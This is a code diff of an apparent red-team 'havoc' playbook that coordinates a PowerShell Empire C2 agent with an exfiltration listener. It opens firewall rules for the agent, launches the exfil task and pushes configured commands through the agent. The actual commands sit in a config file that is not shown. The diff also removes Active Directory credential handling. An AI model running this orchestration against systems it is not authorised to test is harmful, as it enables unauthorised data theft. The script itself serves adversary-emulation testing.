@@ -12,7 +12,7 @@ from configparser import ConfigParser
 # Import the havoc Python package.
 import havoc
 
-init_parser = argparse.ArgumentParser(description='havoc playbook - Windows Exfil')
+init_parser = argparse.ArgumentParser(description='havoc playbook - Simple Exfil')
 
 init_parser.add_argument('--profile', help='Use a specific profile from your credential file')
 init_args = init_parser.parse_args()
@@ -47,24 +47,16 @@ pp = pprint.PrettyPrinter(indent=4)
 
 # Create a config parser and setup config parameters
 config = ConfigParser()
-config.read('havoc-playbooks/windows_exfil/windows_exfil.ini')
+config.read('havoc-playbooks/simple_exfil/simple_exfil.ini')
 
 exfil_type = config.get('exfil_task', 'exfil_type')
 exfil_port = config.get('exfil_task', 'exfil_port')
 exfil_outfile = config.get('exfil_task', 'exfil_outfile')
 exfil_task_domain_name = config.get('exfil_task', 'domain_name')
 exfil_subj = config.get('exfil_task', 'cert_subj')
-command_list = config.get('c2_task', 'command_list')
-remote_ad_task_name = config.get('remote_ad_task', 'task_name')
-ad_tld = config.get('remote_ad_task', 'ad_tld')
-ad_domain = config.get('remote_ad_task', 'ad_domain')
-ad_realm = config.get('remote_ad_task', 'ad_realm')
-user_name = config.get('remote_ad_task', 'user_name')
-user_password = config.get('remote_ad_task', 'user_password')
-admin_password = config.get('remote_ad_task', 'admin_password')
-remote_c2_agent_task_name = config.get('remote_c2_agent_task', 'task_name')
 c2_task_name = config.get('c2_task', 'task_name')
 c2_agent_name = config.get('c2_task', 'agent_name')
+command_list = config.get('c2_task', 'command_list')
 
 exfil_task_exists = None
 exfil_portgroup_exists = None
@@ -106,26 +98,6 @@ if c2_task:
 else:
     exit(f'No powershell_empire task with name {c2_task_name} was found. Exiting...')
 
-# Verify remote_ad_task exists
-print(f'\nVerifying that trainman task {remote_ad_task_name} exists.')
-target_ip = None
-remote_ad_task = h.verify_task(remote_ad_task_name, 'trainman')
-if remote_ad_task:
-    print(f'Trainman task {remote_ad_task_name} found.')
-    target_ip = get_task_target_ip(remote_ad_task_name)
-else:
-    exit(f'No trainman task with name {remote_ad_task_name} was found. Exiting...')
-
-# Verify remote_c2_agent_task exists
-print(f'\nVerifying that trainman task {remote_c2_agent_task_name} exists.')
-agent_ip = None
-agent_task = h.verify_task(remote_c2_agent_task_name, 'trainman')
-if agent_task:
-    print(f'Trainman task {remote_c2_agent_task_name} found.')
-    agent_ip = agent_task['attack_ip']
-else:
-    exit(f'No trainman task with name {remote_c2_agent_task_name} was found. Exiting...')
-
 # Verify that the C2 agent exists.
 print(f'\nVerifying that agent {c2_agent_name} exists.')
 c2_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
@@ -133,27 +105,27 @@ c2_instruct_command = 'get_agents'
 c2_instruct_args = {'Name': c2_agent_name}
 agents_list = h.interact_with_task(c2_task_name, c2_instruct_command, c2_instruct_instance, c2_instruct_args)
 agent_exists = False
+agent_ip = None
 for agent in agents_list['agents']:
     if c2_agent_name == agent['name']:
+        agent_ip = agent['external_ip']
         agent_exists = True
 if agent_exists:
     print(f'Agent {c2_agent_name} exists. Continuing...\n')
 else:
-    print(f'Agent {c2_agent_name} not found. Exiting...\n')
-    clean_up()
+    exit(f'Agent {c2_agent_name} not found. Exiting...\n')
 
 # Create a portgroup for the Exfil task.
 print(f'\nCreating a portgroup for the Exfil task.')
-h.create_portgroup(f'exfil_{exfil_type}', f'Allows port {exfil_port} traffic')
-print(f'\nAdding portgroup rule to allow {remote_c2_agent_task_name} task agent IP {agent_ip} to reach '
-      f'port {exfil_port}.\n')
-h.update_portgroup_rule(f'exfil_{exfil_type}', 'add', f'{agent_ip}/32', exfil_port, 'tcp')
-h.update_portgroup_rule(f'exfil_{exfil_type}', 'add', f'{agent_ip}/32', exfil_port, 'udp')
-exfil_portgroup_exists = f'exfil_{exfil_type}'
+h.create_portgroup(f'exfil_{exfil_type}_{sdate}', f'Allows port {exfil_port} traffic')
+print(f'\nAdding portgroup rule to allow agent IP {agent_ip} to reach port {exfil_port}.\n')
+h.update_portgroup_rule(f'exfil_{exfil_type}_{sdate}', 'add', f'{agent_ip}/32', exfil_port, 'tcp')
+h.update_portgroup_rule(f'exfil_{exfil_type}_{sdate}', 'add', f'{agent_ip}/32', exfil_port, 'udp')
+exfil_portgroup_exists = f'exfil_{exfil_type}_{sdate}'
 
 # Launch an Exfil task
 exfil_task_name = f'exfil_{exfil_type}_{sdate}'
-portgroups = [f'exfil_{exfil_type}']
+portgroups = [f'exfil_{exfil_type}_{sdate}']
 if exfil_task_domain_name == 'None':
     exfil_task_host_name = 'None'
 else:
@@ -203,13 +175,7 @@ for command in command_list.split(', '):
         input('Paused. Press Enter to continue...')
         command = 'whoami'
     # Replace variables in shell_command
-    target_insert = re.sub('\$TARGET', target_ip, command)
-    tld_insert = re.sub('\$AD_TLD', ad_tld, target_insert)
-    domain_insert = re.sub('\$AD_DOMAIN', ad_domain, tld_insert)
-    user_name_insert = re.sub('\$USER_NAME', user_name, domain_insert)
-    user_password_insert = re.sub('\$USER_PASSWORD', user_password, user_name_insert)
-    admin_password_insert = re.sub('\$ADMIN_PASSWORD', admin_password, user_password_insert)
-    exfil_outfile_insert = re.sub('\$EXFIL_OUTFILE', exfil_outfile, admin_password_insert)
+    exfil_outfile_insert = re.sub('\$EXFIL_OUTFILE', exfil_outfile, command)
     exfil_type_insert = re.sub('\$EXFIL_TYPE', exfil_type, exfil_outfile_insert)
     exfil_host_insert = re.sub('\$EXFIL_HOST', exfil_host, exfil_type_insert)
     shell_command = re.sub('\$EXFIL_PORT', exfil_port, exfil_host_insert)
